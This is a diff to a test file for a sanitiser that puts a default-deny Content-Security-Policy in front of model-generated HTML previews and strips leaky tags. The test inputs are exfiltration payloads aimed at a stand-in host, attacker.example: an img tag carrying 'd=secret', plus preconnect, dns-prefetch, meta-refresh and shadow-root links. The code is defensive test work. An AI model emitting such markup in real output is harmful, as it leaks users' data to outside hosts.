@@ -1,4 +1,4 @@
-import { PREVIEW_IMAGE_CSP, htmlPreviewSrcDoc, isRemoteImageUrl } from '../remoteImages';
+import { STATIC_PREVIEW_CSP, isRemoteImageUrl, staticHtmlPreviewSrcDoc } from '../remoteImages';
 
 describe('isRemoteImageUrl', () => {
   const origin = 'http://localhost:5701';
@@ -43,14 +43,33 @@ describe('isRemoteImageUrl', () => {
   });
 });
 
-describe('htmlPreviewSrcDoc', () => {
-  it('injects a CSP that blocks remote images ahead of the model HTML', () => {
-    const srcDoc = htmlPreviewSrcDoc('<img src="https://attacker.example/?d=secret">');
+describe('staticHtmlPreviewSrcDoc', () => {
+  it('puts a default-deny CSP ahead of the model HTML', () => {
+    const srcDoc = staticHtmlPreviewSrcDoc('<img src="https://attacker.example/?d=secret">');
 
-    expect(srcDoc).toContain(`content="${PREVIEW_IMAGE_CSP}"`);
-    expect(PREVIEW_IMAGE_CSP).toBe("img-src 'self' data: blob:");
+    expect(srcDoc).toContain(`content="${STATIC_PREVIEW_CSP}"`);
+    expect(STATIC_PREVIEW_CSP).toContain("default-src 'none'");
     expect(srcDoc.indexOf('Content-Security-Policy')).toBeLessThan(
       srcDoc.indexOf('attacker.example')
     );
+  });
+
+  it.each([
+    ['preconnect hint', '<link rel="preconnect" href="https://attacker.example">'],
+    ['dns-prefetch hint', '<p><link rel="dns-prefetch" href="//attacker.example"></p>'],
+    ['meta refresh', '<meta http-equiv="refresh" content="0;url=https://attacker.example/">'],
+    [
+      'declarative shadow root',
+      '<div><template shadowrootmode="open"><link rel="preconnect" href="//attacker.example"></template></div>',
+    ],
+  ])('removes a %s', (_name, html) => {
+    expect(staticHtmlPreviewSrcDoc(html)).not.toContain('attacker.example');
+  });
+
+  it('keeps ordinary markup and inline styles', () => {
+    const srcDoc = staticHtmlPreviewSrcDoc('<style>h1 { color: red }</style><h1>Title</h1>');
+
+    expect(srcDoc).toContain('<style>h1 { color: red }</style>');
+    expect(srcDoc).toContain('<h1>Title</h1>');
   });
 });
